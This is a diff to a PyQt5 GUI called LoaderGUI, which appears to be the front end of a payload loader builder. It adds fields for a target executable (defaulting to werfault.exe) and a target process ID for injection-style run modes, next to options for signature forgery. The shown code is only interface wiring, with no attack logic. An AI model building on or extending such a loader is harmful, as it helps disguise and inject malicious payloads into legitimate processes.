@@ -5,7 +5,7 @@
 import os
 from PyQt5.QtCore import QSize
 from PyQt5.QtWidgets import (
-    QWidget, QPushButton, QTextEdit,
+    QWidget, QPushButton, QTextEdit, QLineEdit,
     QVBoxLayout, QHBoxLayout, QGroupBox, QMessageBox, QProgressBar, QCheckBox
 )
 from PyQt5.QtGui import QIcon, QMovie
@@ -142,9 +142,20 @@ class LoaderGUI(QWidget):
     def _create_run_mode_group(self):
         """创建运行方式组"""
         run_group = QGroupBox('运行方式')
-        run_layout = QHBoxLayout()
+        run_layout = QVBoxLayout()
         self.run_mode_box = create_run_mode_combobox()
+        self.run_mode_box.currentIndexChanged.connect(self.on_run_mode_changed)
+        self.target_input = QLineEdit()
+        self.target_input.setPlaceholderText("输入目标程序路径 (如: C:/Windows/System32/notepad.exe)")
+        self.target_input.setText(r"C:/Windows/System32/werfault.exe")  # 设置默认值
+        self.target_input.hide()  # 默认隐藏
+        self.pid_input = QLineEdit()
+        self.pid_input.setPlaceholderText("输入目标进程ID (如: 1234)")
+        self.pid_input.setText("0")  # 设置默认值
+        self.pid_input.hide()  # 默认隐藏
         run_layout.addWidget(self.run_mode_box)
+        run_layout.addWidget(self.target_input)
+        run_layout.addWidget(self.pid_input)
         run_group.setLayout(run_layout)
         return run_group
     
@@ -265,6 +276,10 @@ class LoaderGUI(QWidget):
         if not target:
             target = self.target_box.currentText()
         
+        target_program = self.target_input.text().strip() if self.target_input.isVisible() else ""
+        
+        target_pid = self.pid_input.text().strip() if self.pid_input.isVisible() else "0"
+        
         return {
             'input_bin': input_bin,
             'run_mode': run_mode,
@@ -275,7 +290,9 @@ class LoaderGUI(QWidget):
             'sign_app': sign_app,
             'forgery_enable': forgery_enable,
             'mem_mode': mem_mode,
-            'target': target
+            'target': target,
+            'target_program': target_program,
+            'target_pid': target_pid
         }
     
     def on_gen_error(self, msg):
@@ -285,6 +302,25 @@ class LoaderGUI(QWidget):
         self.progress.setValue(0)
         self.log_append('[错误] ' + msg)
         QMessageBox.critical(self, '错误', msg)
+
+    def on_run_mode_changed(self):
+        """运行方式改变时显示/隐藏输入框"""
+        manifest = load_plugins_manifest()
+        run_modes = manifest.get('run_modes', [])
+        run_mode_id = self.run_mode_box.itemData(self.run_mode_box.currentIndex())
+        for rm in run_modes:
+            if rm['id'] == run_mode_id:
+                pattern = rm.get('pattern', 1)
+                if pattern == 2:
+                    self.target_input.show()
+                    self.pid_input.hide()
+                elif pattern == 3:
+                    self.target_input.hide()
+                    self.pid_input.show()
+                else:
+                    self.target_input.hide()
+                    self.pid_input.hide()
+                break
 
     def on_gen_done(self, dst_file):
         """处理构建完成"""
